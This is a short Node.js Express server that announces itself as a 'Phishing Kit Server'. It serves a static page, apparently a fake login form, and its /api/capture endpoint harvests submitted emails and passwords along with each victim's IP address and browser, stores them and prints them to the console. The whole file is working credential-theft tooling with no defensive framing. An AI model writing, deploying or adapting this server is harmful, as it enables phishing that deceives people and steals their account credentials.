const express = require('express');
const path = require('path');
const app = express();

// Middleware to parse JSON and URL-encoded forms
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Simple in-memory log
const capturedCredentials = [];

// Endpoint to capture the login
app.post('/api/capture', (req, res) => {
    // Handle both JSON and Form Data
    let email = req.body.email;
    let password = req.body.password;
    
    // If the body is empty (e.g., content-type mismatch), try to get from query
    if (!email && req.query.email) email = req.query.email;
    if (!password && req.query.password) password = req.query.password;

    const timestamp = new Date().toISOString();
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const logEntry = {
        timestamp: timestamp,
        email: email,
        password: password,
        userAgent: userAgent,
        ip: ip
    };

    capturedCredentials.push(logEntry);

    // 1. Log to console
    console.log(`\n[NEW CREDENTIAL CAPTURED]`);
    console.log(`Time: ${timestamp}`);
    console.log(`Email: ${email}`);
    console.log(`Pass:  ${password}`);
    console.log(`IP:    ${ip}`);
    console.log(`UA:    ${userAgent}\n`);

    // 2. Send response to client
    res.status(200).json({ success: true, message: 'Data captured successfully' });
});

// Serve the static HTML file
// This ensures that when you go to localhost:3000, it serves index.html
app.use(express.static(__dirname));

// Catch-all to ensure index.html is served for root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Error handler
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something broke!');
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`------------------------------------------------`);
    console.log(` Phishing Kit Server is LIVE`);
    console.log(`------------------------------------------------`);
    console.log(` Open your browser and go to: http://localhost:${PORT}`);
    console.log(`------------------------------------------------`);
});